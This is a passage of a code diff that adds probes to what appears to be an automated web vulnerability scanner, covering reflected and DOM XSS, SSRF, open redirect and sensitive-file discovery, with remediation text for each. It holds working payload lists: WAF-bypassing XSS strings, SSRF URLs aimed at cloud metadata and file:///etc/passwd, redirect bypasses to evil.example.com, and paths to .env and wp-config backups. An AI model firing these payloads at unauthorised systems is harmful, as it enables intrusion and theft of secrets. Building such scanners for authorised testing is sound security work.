+                        prop_parsed = _urlparse(seed_page)
+                        prop_base = f"{prop_parsed.scheme}://{prop_parsed.netloc}{prop_parsed.path or '/'}"
+                        param_tpl = "?" + param + "={canary}"
+                        reflection_points.append(
+                            (param, param_tpl, direct_ctx, prop_base))
+                        _progress("active_baseline_step", {
+                            "host": host,
+                            "step": "xss_propagation_direct_reflection",
+                            "param": param, "context": direct_ctx,
+                            "source_url": prop_base,
+                        })
+                        _found_prop = True
+                        break
+
+                    # Extract <a href> links that carry the canary forward
+                    _canary_esc = _re.escape(canary)
+                    prop_links = _re.findall(
+                        r'<a\b[^>]*\bhref\s*=\s*["\']([^"\']*' +
+                        _canary_esc + r'[^"\']*)["\']',
+                        prop_html, _re.IGNORECASE,
+                    )
+                    if not prop_links:
+                        prop_links = _re.findall(
+                            r'<a\b[^>]*\bhref\s*=\s*([^\s>]*' +
+                            _canary_esc + r'[^\s>]*)',
+                            prop_html, _re.IGNORECASE,
+                        )
+                    if not prop_links:
+                        continue
+
+                    _progress("active_baseline_step", {
+                        "host": host, "step": "xss_propagation_detected",
+                        "param": param, "seed_page": seed_page,
+                        "link_count": len(prop_links),
+                    })
+
+                    for link_href in prop_links[:3]:
+                        if link_href.startswith("//"):
+                            follow_url = "https:" + link_href
+                        elif link_href.startswith("/"):
+                            follow_url = f"https://{host}{link_href}"
+                        elif link_href.startswith("http"):
+                            follow_url = link_href
+                        else:
+                            seed_p = _urlparse(seed_page)
+                            seed_dir = seed_p.path.rsplit("/", 1)[0] if "/" in (seed_p.path or "") else ""
+                            follow_url = f"{seed_p.scheme}://{seed_p.netloc}{seed_dir}/{link_href}"
+
+                        try:
+                            sub_resp = await http_client.get(
+                                follow_url, timeout=10.0,
+                                follow_redirects=True,
+                                headers=_PROBE_HEADERS,
+                            )
+                            sub_ctx = _classify_canary_context(
+                                sub_resp.text[:200_000], canary)
+                            if sub_ctx:
+                                sub_parsed = _urlparse(follow_url)
+                                sub_base = f"{sub_parsed.scheme}://{sub_parsed.netloc}{sub_parsed.path or '/'}"
+                                param_tpl = "?" + param + "={canary}"
+                                reflection_points.append(
+                                    (param, param_tpl, sub_ctx, sub_base))
+                                _progress("active_baseline_step", {
+                                    "host": host,
+                                    "step": "xss_propagation_reflection",
+                                    "param": param, "context": sub_ctx,
+                                    "seed_page": seed_page,
+                                    "source_url": sub_base,
+                                })
+                                _found_prop = True
+                                break
+                        except Exception:
+                            continue
+                except Exception:
+                    continue
+
+        if not reflection_points:
+            continue
+
+        # ── Step 3: Payload escalation per context ────────────────
+        for param_name, param_tpl, ctx, source_base in reflection_points[:10]:
+            if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
+                payloads = [
+                    (lbl, tpl.replace("{C}", "alert(1)"))
+                    for lbl, tpl in _XSS_JS_PAYLOADS
+                ]
+            elif ctx == "html_attribute":
+                payloads = list(_XSS_ATTR_PAYLOADS)
+            else:
+                payloads = list(_XSS_HTML_PAYLOADS)
+
+            for payload_label, payload in payloads:
+                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                    break
+                filled_tpl = param_tpl.format(canary=payload)
+                if filled_tpl.startswith("/"):
+                    test_url = f"{source_base}{filled_tpl}"
+                elif "?" in source_base:
+                    test_url = f"{source_base}&{filled_tpl.lstrip('?')}"
+                else:
+                    test_url = f"{source_base}{filled_tpl}"
+                try:
+                    resp = await http_client.get(
+                        test_url, timeout=10.0, follow_redirects=True,
+                        headers=_PROBE_HEADERS,
+                    )
+                    body = resp.text[:200_000]
+                except Exception:
+                    continue
+
+                if payload not in body:
+                    continue
+
+                if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
+                    sev = "Critical"
+                    title = (
+                        f"Reflected XSS via JavaScript Context Breakout "
+                        f"({param_name}, {ctx})"
+                    )
+                    evidence = (
+                        f"User input from parameter '{param_name}' (dynamically "
+                        f"discovered on {host}) is reflected unencoded inside a "
+                        f"{ctx.replace('_', ' ')}. Payload '{payload_label}' "
+                        f"bypasses WAF by avoiding <, >, =, /, comma and breaking "
+                        f"out of the JS string context: {payload}"
+                    )
+                else:
+                    sev = "High"
+                    title = f"Reflected XSS via {param_name}"
+                    evidence = (
+                        f"Payload '{payload_label}' reflected unencoded in the "
+                        f"response body when injected via parameter '{param_name}' "
+                        f"(dynamically discovered on {host}): {payload}"
+                    )
+
+                f = {
+                    "title": title,
+                    "severity": sev,
+                    "confidence": "High",
+                    "owasp_category": "A03:2021",
+                    "cwe": "CWE-79",
+                    "url": test_url,
+                    "parameter": param_name,
+                    "payload": payload,
+                    "evidence": evidence,
+                    "remediation": (
+                        "Context-aware encode all user input before reflecting "
+                        "it. For JS string contexts, JSON-encode then HTML-"
+                        "escape; for HTML body, HTML-escape; for attribute "
+                        "values, use attribute encoding. Deploy a strict "
+                        "Content-Security-Policy as defense-in-depth."
+                    ),
+                    "phase": "Active Baseline (Reflected XSS)",
+                    "tool": "active_baseline.reflected_xss_probe",
+                    "_finding_source": "active_baseline",
+                    "_payload_label": payload_label,
+                    "_xss_context": ctx,
+                }
+                findings.append(f)
+                _emit(f)
+                break
+
+    _progress("active_baseline_end", {
+        "probe": "reflected_xss", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# DOM XSS Probe — Playwright-based browser verification
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Complements the HTTP-based reflected XSS probe by using an actual
+# browser to detect DOM-based XSS where:
+#   1. The payload is consumed only by client-side JavaScript
+#   2. The payload propagates through navigation (click a link → sub-page
+#      JS reads location.search → alert fires)
+#
+# This replicates the manual pentester workflow:
+#   visit root?key=payload → click link → observe alert() popup
+
+_DOM_XSS_PAYLOADS: list[tuple[str, str]] = [
+    ("js_squote_break", "x%27)-alert(79135)-(%27"),
+    ("js_dquote_break", 'x%22)-alert(79135)-(%22'),
+    ("html_img", "%3Cimg%20src=x%20onerror=alert(79135)%3E"),
+    ("html_svg", "%3Csvg%20onload=alert(79135)%3E"),
+]
+
+_DOM_XSS_ALERT_MARKER = "79135"
+
+
+async def run_dom_xss_probe(
+    browser,
+    hosts: list[str],
+    crawled_urls: Iterable[str] = (),
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Use Playwright to detect DOM XSS by navigating with payloads and
+    catching alert() dialogs.  Covers param propagation through link clicks."""
+
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda *a, **kw: None)
+
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in crawled_urls:
+        try:
+            h = urlparse(curl).netloc.split(":")[0].lower()
+            _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            pass
+
+    for host in hosts:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+
+        base_url = f"https://{host}"
+        _progress("active_baseline_step", {
+            "host": host, "step": "dom_xss_start",
+        })
+
+        # Collect HTML sub-pages to test (skip static assets)
+        _static_exts = ('.js', '.css', '.png', '.jpg', '.gif', '.svg',
+                        '.woff', '.woff2', '.ttf', '.ico', '.map',
+                        '.xml', '.json', '.pbf')
+        seed_pages = [base_url]
+        for curl in _crawled_by_host.get(host, [])[:30]:
+            if not any(curl.lower().endswith(e) for e in _static_exts):
+                cp = urlparse(curl)
+                page_base = f"{cp.scheme}://{cp.netloc}{cp.path or '/'}"
+                if page_base not in seed_pages:
+                    seed_pages.append(page_base)
+
+        # Discover params from seed pages using the same regex
+        params_to_test: set[str] = set()
+        for sp in seed_pages[:5]:
+            try:
+                context = await browser.new_context(
+                    ignore_https_errors=True, java_script_enabled=True)
+                pg = await context.new_page()
+                await pg.goto(sp, wait_until="domcontentloaded", timeout=15000)
+                html = await pg.content()
+                for m in _re.finditer(
+                    r'[?&]([A-Za-z_][A-Za-z0-9_-]{0,40})=', html):
+                    params_to_test.add(m.group(1).lower())
+                await context.close()
+            except Exception:
+                try:
+                    await context.close()
+                except Exception:
+                    pass
+
+        if not params_to_test:
+            params_to_test = {"key", "q", "search", "id", "style"}
+
+        _progress("active_baseline_step", {
+            "host": host, "step": "dom_xss_params",
+            "count": len(params_to_test),
+            "params": sorted(params_to_test)[:20],
+        })
+
+        # For each param × payload, navigate and check for alert()
+        for param in sorted(params_to_test)[:10]:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+
+            for payload_label, payload in _DOM_XSS_PAYLOADS:
+                _alert_fired = False
+                _alert_text = ""
+                _trigger_url = ""
+
+                try:
+                    context = await browser.new_context(
+                        ignore_https_errors=True, java_script_enabled=True)
+                    pg = await context.new_page()
+
+                    def _on_dialog(dialog):
+                        nonlocal _alert_fired, _alert_text
+                        if _DOM_XSS_ALERT_MARKER in (dialog.message or ""):
+                            _alert_fired = True
+                            _alert_text = dialog.message
+                        asyncio.ensure_future(dialog.accept())
+
+                    pg.on("dialog", _on_dialog)
+
+                    # Step 1: Navigate to root page with payload
+                    root_url = f"{base_url}?{param}={payload}"
+                    await pg.goto(root_url, wait_until="domcontentloaded",
+                                  timeout=15000)
+                    await asyncio.sleep(1.5)
+
+                    if _alert_fired:
+                        _trigger_url = root_url
+                    else:
+                        # Step 2: Click all <a> links on the page
+                        link_count = await pg.evaluate(
+                            "() => document.querySelectorAll('a[href]').length")
+                        for i in range(min(link_count or 0, 15)):
+                            if _alert_fired:
+                                break
+                            try:
+                                await pg.evaluate(
+                                    f"() => document.querySelectorAll('a[href]')[{i}].click()")
+                                await asyncio.sleep(2.0)
+                                if _alert_fired:
+                                    _trigger_url = pg.url
+                                    break
+                                await pg.go_back(wait_until="domcontentloaded",
+                                                 timeout=5000)
+                                await asyncio.sleep(0.5)
+                            except Exception:
+                                try:
+                                    await pg.goto(
+                                        root_url,
+                                        wait_until="domcontentloaded",
+                                        timeout=10000)
+                                    await asyncio.sleep(1.0)
+                                except Exception:
+                                    break
+
+                    # Step 3: Also test sub-pages directly
+                    if not _alert_fired:
+                        for sp in seed_pages[1:6]:
+                            if _alert_fired:
+                                break
+                            try:
+                                sep = "&" if "?" in sp else "?"
+                                sub_url = f"{sp}{sep}{param}={payload}"
+                                await pg.goto(
+                                    sub_url,
+                                    wait_until="domcontentloaded",
+                                    timeout=10000)
+                                await asyncio.sleep(2.0)
+                                if _alert_fired:
+                                    _trigger_url = sub_url
+                            except Exception:
+                                continue
+
+                    await context.close()
+                except Exception as e:
+                    logger.debug("DOM XSS probe error: %s", e)
+                    try:
+                        await context.close()
+                    except Exception:
+                        pass
+                    continue
+
+                if _alert_fired:
+                    f = {
+                        "title": (
+                            f"DOM-Based XSS via '{param}' Parameter "
+                            f"(Browser-Verified)"
+                        ),
+                        "severity": "Critical",
+                        "confidence": "Confirmed",
+                        "owasp_category": "A03:2021",
+                        "cwe": "CWE-79",
+                        "url": _trigger_url or root_url,
+                        "parameter": param,
+                        "payload": payload,
+                        "evidence": (
+                            f"Playwright browser navigated to page with "
+                            f"?{param}={payload} and detected a JavaScript "
+                            f"alert() dialog containing '{_alert_text}'. "
+                            f"This confirms DOM-based XSS where client-side "
+                            f"JavaScript reads the parameter from "
+                            f"location.search and injects it into a "
+                            f"dangerous sink without sanitization."
+                        ),
+                        "remediation": (
+                            "Sanitize all values read from location.search, "
+                            "location.hash, document.referrer and other DOM "
+                            "sources before passing them to dangerous sinks "
+                            "(innerHTML, eval, document.write, script src). "
+                            "Use textContent instead of innerHTML. Deploy a "
+                            "strict Content-Security-Policy."
+                        ),
+                        "phase": "Active Baseline (DOM XSS)",
+                        "tool": "active_baseline.dom_xss_probe",
+                        "_finding_source": "active_baseline",
+                        "_payload_label": payload_label,
+                        "_xss_context": "dom_xss_browser_verified",
+                    }
+                    findings.append(f)
+                    _emit(f)
+                    _progress("active_baseline_step", {
+                        "host": host, "step": "dom_xss_confirmed",
+                        "param": param, "payload_label": payload_label,
+                        "trigger_url": _trigger_url or root_url,
+                    })
+                    break  # One confirmed payload per param is enough
+
+    _progress("active_baseline_end", {
+        "probe": "dom_xss", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 4 — SSRF Bypass Probe (Dynamic Discovery)
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Dynamically discovers URL-accepting parameters on the target page,
+# then tests each with cloud metadata / internal IP bypass payloads.
+# No hardcoded param list — discovery is based on:
+#   a) Page HTML parsing (same as XSS discovery)
+#   b) Semantic filtering: params whose NAME or VALUE suggest URL input.
+
+_SSRF_PARAM_NAME_HINTS = _re.compile(
+    r"(url|uri|href|link|src|redirect|redir|next|goto|dest|target"
+    r"|return|callback|proxy|fetch|path|endpoint|resource|load|open"
+    r"|file|page|site|domain|host|image|img|icon|logo|download|ref)",
+    _re.IGNORECASE,
+)
+
+_SSRF_PAYLOADS: list[tuple[str, str, str]] = [
+    # AWS metadata
+    ("aws_metadata_plain", "http://169.254.169.254/latest/meta-data/", "ami-id"),
+    ("aws_metadata_hex", "http://0xa9fea9fe/latest/meta-data/", "ami-id"),
+    ("aws_metadata_decimal", "http://2852039166/latest/meta-data/", "ami-id"),
+    ("aws_metadata_ipv6", "http://[::ffff:169.254.169.254]/latest/meta-data/", "ami-id"),
+    ("aws_imdsv2_token", "http://169.254.169.254/latest/api/token", ""),
+    # GCP metadata
+    ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "attributes"),
+    ("gcp_metadata_ip", "http://169.254.169.254/computeMetadata/v1/", "attributes"),
+    # Azure metadata
+    ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"),
+    # Localhost variations
+    ("localhost_127001", "http://127.0.0.1:80/", ""),
+    ("localhost_hex", "http://0x7f000001/", ""),
+    ("localhost_decimal", "http://2130706433/", ""),
+    ("localhost_ipv6", "http://[::1]/", ""),
+    ("localhost_short", "http://127.1/", ""),
+    ("localhost_0000", "http://0.0.0.0/", ""),
+    ("localhost_octal", "http://0177.0.0.1/", ""),
+    # URL schema bypasses
+    ("file_etc_passwd", "file:///etc/passwd", "root:"),
+    ("file_win_hosts", "file:///c:/windows/system32/drivers/etc/hosts", "localhost"),
+    # DNS rebinding / redirect bypass
+    ("redirect_bypass_at", "http://127.0.0.1@evil.example.com/", ""),
+    ("redirect_bypass_hash", "http://evil.example.com#@127.0.0.1/", ""),
+    # Internal common ports
+    ("internal_8080", "http://127.0.0.1:8080/", ""),
+    ("internal_3000", "http://127.0.0.1:3000/", ""),
+    ("internal_9200_es", "http://127.0.0.1:9200/", "cluster_name"),
+    ("internal_6379_redis", "http://127.0.0.1:6379/", ""),
+    ("internal_11211_memcache", "http://127.0.0.1:11211/", ""),
+]
+
+_SSRF_HEADER_PAYLOADS: list[tuple[str, str, str]] = [
+    ("x_forwarded_for_internal", "X-Forwarded-For", "127.0.0.1"),
+    ("x_real_ip_internal", "X-Real-IP", "127.0.0.1"),
+    ("x_originating_ip", "X-Originating-IP", "127.0.0.1"),
+    ("x_client_ip", "X-Client-IP", "127.0.0.1"),
+    ("client_ip", "Client-IP", "127.0.0.1"),
+    ("x_forwarded_for_metadata", "X-Forwarded-For", "169.254.169.254"),
+]
+
+_SSRF_FALLBACK_PARAMS = ["url", "redirect", "next", "target", "dest",
+                         "callback", "path", "proxy", "fetch"]
+
+
+def _discover_ssrf_params(html: str) -> list[str]:
+    """From page HTML, discover params likely to accept URLs.
+
+    Strategy:
+      1. Parse all param names from the page (same as XSS discovery).
+      2. Also find params whose VALUES look like URLs (http/https//).
+      3. Filter by name heuristic (the name regex above).
+      4. Return deduplicated list.
+    """
+    all_params = _discover_params_from_html(html, "")
+
+    url_value_params: set[str] = set()
+    for m in _re.finditer(
+        r'[?&]([A-Za-z_][A-Za-z0-9_-]{0,40})=(https?%3[Aa]|https?://|//)',
+        html,
+    ):
+        url_value_params.add(m.group(1).lower())
+
+    candidates: set[str] = set()
+    for p in all_params:
+        if _SSRF_PARAM_NAME_HINTS.search(p):
+            candidates.add(p)
+    candidates.update(url_value_params)
+    return sorted(candidates) if candidates else list(_SSRF_FALLBACK_PARAMS)
+
+
+async def run_ssrf_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    crawled_urls: Iterable[str] | None = None,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for SSRF using dynamically discovered URL params."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in (crawled_urls or []):
+        try:
+            h = (_urlparse(curl).hostname or "").lower()
+            if h:
+                _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            continue
+
+    _progress("active_baseline_start", {
+        "probe": "ssrf_bypass", "hosts": len(targets),
+    })
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        # Discover URL-accepting params from root + crawled pages
+        combined_html = ""
+        try:
+            page_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            combined_html = page_resp.text[:500_000]
+        except Exception:
+            pass
+
+        for curl in _crawled_by_host.get(host, [])[:20]:
+            try:
+                parsed = _urlparse(curl)
+                for k in _parse_qs(parsed.query or ""):
+                    combined_html += f' href="?{k}=https://x"'
+                cresp = await http_client.get(
+                    curl, timeout=8.0, follow_redirects=True,
+                    headers=_PROBE_HEADERS,
+                )
+                combined_html += cresp.text[:300_000]
+            except Exception:
+                continue
+
+        ssrf_params = _discover_ssrf_params(combined_html)
+        _progress("active_baseline_step", {
+            "host": host, "step": "ssrf_params_discovered",
+            "count": len(ssrf_params), "params": ssrf_params[:20],
+        })
+
+        for param in ssrf_params[:15]:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            benign_url = f"{base_url}?{param}=https://example.com/"
+            try:
+                benign_resp = await http_client.get(
+                    benign_url, timeout=10.0, follow_redirects=False,
+                    headers=_PROBE_HEADERS,
+                )
+                benign_status = benign_resp.status_code
+            except Exception:
+                continue
+
+            if benign_status in (404, 405, 501):
+                continue
+
+            for payload_label, payload_url, fingerprint in _SSRF_PAYLOADS:
+                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                    break
+                test_url = f"{base_url}?{param}={payload_url}"
+                try:
+                    resp = await http_client.get(
+                        test_url, timeout=10.0, follow_redirects=False,
+                        headers=_PROBE_HEADERS,
+                    )
+                    body = resp.text[:100_000]
+                    status = resp.status_code
+                except Exception:
+                    continue
+
+                is_ssrf = False
+                evidence_detail = ""
+
+                if fingerprint and fingerprint in body:
+                    is_ssrf = True
+                    evidence_detail = (
+                        f"Cloud metadata fingerprint '{fingerprint}' in response."
+                    )
+                elif (status == 200 and benign_status != 200
+                      and len(body) > 100
+                      and "169.254" not in str(benign_resp.text[:1000])):
+                    is_ssrf = True
+                    evidence_detail = (
+                        f"Status changed from {benign_status} (benign) to "
+                        f"{status} (SSRF payload). Body length: {len(body)}."
+                    )
+
+                if not is_ssrf:
+                    continue
+
+                f = {
+                    "title": f"SSRF via {param} ({payload_label})",
+                    "severity": "Critical" if "metadata" in payload_label else "High",
+                    "confidence": "High" if fingerprint else "Medium",
+                    "owasp_category": "A10:2021",
+                    "cwe": "CWE-918",
+                    "url": test_url,
+                    "parameter": param,
+                    "payload": payload_url,
+                    "evidence": (
+                        f"SSRF bypass payload '{payload_label}' ({payload_url}) "
+                        f"injected via dynamically discovered param '{param}'. "
+                        f"{evidence_detail}"
+                    ),
+                    "remediation": (
+                        "Validate and sanitize all URL inputs server-side. "
+                        "Use an allow-list of permitted domains/IPs. "
+                        "Block requests to internal IP ranges (169.254.x.x, "
+                        "127.x.x.x, 10.x.x.x, ::1, etc.) at the network level. "
+                        "Disable cloud metadata access from application containers."
+                    ),
+                    "phase": "Active Baseline (SSRF Bypass)",
+                    "tool": "active_baseline.ssrf_probe",
+                    "_finding_source": "active_baseline",
+                    "_payload_label": payload_label,
+                }
+                findings.append(f)
+                _emit(f)
+                break
+
+    # ── Header-based SSRF ──
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        try:
+            normal_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=False,
+                headers=_PROBE_HEADERS,
+            )
+            normal_status = normal_resp.status_code
+            normal_body = normal_resp.text[:20_000]
+            normal_len = len(normal_resp.text)
+        except Exception:
+            continue
+
+        for hlabel, hdr_name, hdr_val in _SSRF_HEADER_PAYLOADS:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            try:
+                resp = await http_client.get(
+                    base_url, timeout=10.0, follow_redirects=False,
+                    headers={**_PROBE_HEADERS, hdr_name: hdr_val},
+                )
+                body = resp.text[:50_000]
+                status = resp.status_code
+            except Exception:
+                continue
+
+            is_ssrf = False
+            evidence_detail = ""
+
+            if status != normal_status and status in (200, 301, 302, 403):
+                is_ssrf = True
+                evidence_detail = (
+                    f"Status changed from {normal_status} to {status} "
+                    f"when {hdr_name}: {hdr_val} was injected."
+                )
+            elif abs(len(body) - normal_len) > 500 and hdr_val in body:
+                is_ssrf = True
+                evidence_detail = (
+                    f"Response body changed significantly "
+                    f"(normal: {normal_len} bytes, with header: {len(body)} bytes) "
+                    f"and contains the injected IP."
+                )
+
+            if not is_ssrf:
+                continue
+
+            f = {
+                "title": f"Header-Based SSRF / IP Spoofing via {hdr_name}",
+                "severity": "Medium",
+                "confidence": "Medium",
+                "owasp_category": "A10:2021",
+                "cwe": "CWE-918",
+                "url": base_url,
+                "parameter": hdr_name,
+                "payload": f"{hdr_name}: {hdr_val}",
+                "evidence": (
+                    f"Injecting {hdr_name}: {hdr_val} changed server behavior. "
+                    f"{evidence_detail}"
+                ),
+                "remediation": (
+                    f"Do not trust {hdr_name} headers for access control or "
+                    f"routing decisions. Validate all IP-based headers against "
+                    f"trusted proxy sources."
+                ),
+                "phase": "Active Baseline (SSRF Bypass)",
+                "tool": "active_baseline.ssrf_probe",
+                "_finding_source": "active_baseline",
+                "_payload_label": hlabel,
+            }
+            findings.append(f)
+            _emit(f)
+
+    _progress("active_baseline_end", {
+        "probe": "ssrf_bypass", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 5 — Open Redirect Probe
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Bug bounty researchers find open redirects in parameters like
+# ?redirect=, ?next=, ?url=, ?dest=, ?lp= that accept external URLs.
+# This probe discovers redirect-like params and tests with an external canary.
+
+_REDIRECT_PARAM_HINTS = _re.compile(
+    r"(redirect|redir|next|url|goto|dest|target|return|returnurl"
+    r"|continue|forward|out|link|to|ref|lp|callback|_externalContentRedirect"
+    r"|ReturnUrl|backUrl|back_url|successUrl|failUrl|errorUrl|cancelUrl)",
+    _re.IGNORECASE,
+)
+
+_REDIRECT_CANARY_DOMAIN = "evil.example.com"
+_REDIRECT_PAYLOADS: list[tuple[str, str]] = [
+    ("plain_url", f"https://{_REDIRECT_CANARY_DOMAIN}/redir"),
+    ("double_slash", f"//{_REDIRECT_CANARY_DOMAIN}/redir"),
+    ("backslash_bypass", f"https://{_REDIRECT_CANARY_DOMAIN}%2f.."),
+    ("at_bypass", f"https://legitimate.com@{_REDIRECT_CANARY_DOMAIN}/"),
+    ("null_byte", f"https://{_REDIRECT_CANARY_DOMAIN}/%00"),
+    ("encoded_slash", f"https:%2F%2F{_REDIRECT_CANARY_DOMAIN}/redir"),
+    ("backslash_scheme", f"/\\{_REDIRECT_CANARY_DOMAIN}"),
+    ("tab_bypass", f"//\t{_REDIRECT_CANARY_DOMAIN}"),
+    ("dotdot_bypass", f"/{_REDIRECT_CANARY_DOMAIN}/%2F.."),
+    ("crlf_bypass", f"/%0d%0aLocation: https://{_REDIRECT_CANARY_DOMAIN}/"),
+    ("data_uri", "data:text/html,<script>alert(1)</script>"),
+    ("javascript_uri", "javascript:alert(1)"),
+    ("triple_slash", f"///{_REDIRECT_CANARY_DOMAIN}"),
+    ("whitespace_bypass", f" https://{_REDIRECT_CANARY_DOMAIN}"),
+]
+
+
+async def run_open_redirect_probe(
+    http_client,
+    hosts: Iterable[str],
+    *,
+    crawled_urls: Iterable[str] | None = None,
+    on_finding: callable | None = None,
+    on_progress: callable | None = None,
+    cancel_flag=None,
+) -> list[dict]:
+    """Probe each host for open redirect via dynamically discovered params."""
+    findings: list[dict] = []
+    _emit = on_finding or (lambda f: None)
+    _progress = on_progress or (lambda event, data: None)
+
+    targets = _normalize_hosts(hosts)
+    if not targets:
+        return findings
+
+    from urllib.parse import urlparse as _urlparse, parse_qs as _parse_qs
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in (crawled_urls or []):
+        try:
+            h = (_urlparse(curl).hostname or "").lower()
+            if h:
+                _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            continue
+
+    _progress("active_baseline_start", {
+        "probe": "open_redirect", "hosts": len(targets),
+    })
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        discovered: set[str] = set()
+        try:
+            page_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            discovered.update(_discover_params_from_html(page_resp.text[:500_000], base_url))
+        except Exception:
+            pass
+
+        for curl in _crawled_by_host.get(host, [])[:20]:
+            try:
+                parsed = _urlparse(curl)
+                for k in _parse_qs(parsed.query or ""):
+                    discovered.add(k.lower())
+                cresp = await http_client.get(
+                    curl, timeout=8.0, follow_redirects=True, headers=_PROBE_HEADERS,
+                )
+                discovered.update(_discover_params_from_html(cresp.text[:300_000], curl))
+            except Exception:
+                continue
+
+        redirect_params = [p for p in discovered if _REDIRECT_PARAM_HINTS.search(p)]
+        if not redirect_params:
+            redirect_params = ["redirect", "next", "url", "dest", "returnurl", "lp"]
+
+        for param in redirect_params[:10]:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            for payload_label, payload_url in _REDIRECT_PAYLOADS:
+                test_url = f"{base_url}?{param}={payload_url}"
+                try:
+                    resp = await http_client.get(
+                        test_url, timeout=10.0, follow_redirects=False,
+                        headers=_PROBE_HEADERS,
+                    )
+                except Exception:
+                    continue
+
+                is_redirect = False
+                location = str(resp.headers.get("location", ""))
+
+                if resp.status_code in (301, 302, 303, 307, 308):
+                    if _REDIRECT_CANARY_DOMAIN in location:
+                        is_redirect = True
+
+                if _REDIRECT_CANARY_DOMAIN in resp.text[:50_000]:
+                    meta_match = _re.search(
+                        r'<meta[^>]*http-equiv\s*=\s*["\']?refresh[^>]*'
+                        + _re.escape(_REDIRECT_CANARY_DOMAIN),
+                        resp.text[:50_000], _re.IGNORECASE,
+                    )
+                    if meta_match:
+                        is_redirect = True
+
+                if not is_redirect:
+                    continue
+
+                f = {
+                    "title": f"Open Redirect via {param}",
+                    "severity": "Medium",
+                    "confidence": "High",
+                    "owasp_category": "A01:2021",
+                    "cwe": "CWE-601",
+                    "url": test_url,
+                    "parameter": param,
+                    "payload": payload_url,
+                    "evidence": (
+                        f"Server responds with {resp.status_code} redirecting to "
+                        f"'{location}' when '{param}' is set to an external URL. "
+                        f"Payload variant: {payload_label}."
+                    ),
+                    "remediation": (
+                        "Validate redirect destinations against an allow-list of "
+                        "permitted domains. Never use user-controlled input directly "
+                        "in Location headers or meta refresh tags."
+                    ),
+                    "phase": "Active Baseline (Open Redirect)",
+                    "tool": "active_baseline.open_redirect_probe",
+                    "_finding_source": "active_baseline",
+                    "_payload_label": payload_label,
+                }
+                findings.append(f)
+                _emit(f)
+                break
+
+    _progress("active_baseline_end", {
+        "probe": "open_redirect", "findings": len(findings),
+    })
+    return findings
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# GAP 6 — Sensitive Path / Info Disclosure Probe
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Checks for well-known sensitive paths: phpinfo, .env, .git/config,
+# debug endpoints, status pages, etc. that leak server configuration.
+
+_SENSITIVE_PATHS: list[tuple[str, str, list[str]]] = [
+    # PHP info disclosure
+    ("phpinfo", "/index.php", ["phpinfo()", "PHP Version", "System =>"]),
+    ("phpinfo_info", "/info.php", ["phpinfo()", "PHP Version"]),
+    ("phpinfo_test", "/test.php", ["phpinfo()", "PHP Version"]),
+    ("phpinfo_phpinfo", "/phpinfo.php", ["phpinfo()", "PHP Version"]),
+    # Configuration files
+    ("dotenv", "/.env", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
+    ("dotenv_bak", "/.env.bak", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
+    ("dotenv_old", "/.env.old", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
+    ("dotenv_dev", "/.env.development", ["DB_PASSWORD", "APP_KEY"]),
+    ("dotenv_prod", "/.env.production", ["DB_PASSWORD", "APP_KEY"]),
+    ("dotenv_local", "/.env.local", ["DB_PASSWORD", "APP_KEY"]),
+    ("wp_config_bak", "/wp-config.php.bak", ["DB_NAME", "DB_PASSWORD"]),
+    ("wp_config_old", "/wp-config.php.old", ["DB_NAME", "DB_PASSWORD"]),
+    ("wp_config_save", "/wp-config.php.save", ["DB_NAME", "DB_PASSWORD"]),
+    ("config_yml", "/config.yml", ["password", "secret", "database"]),
+    ("config_json", "/config.json", ["password", "secret", "apiKey"]),
+    ("appsettings", "/appsettings.json", ["ConnectionStrings", "Password"]),
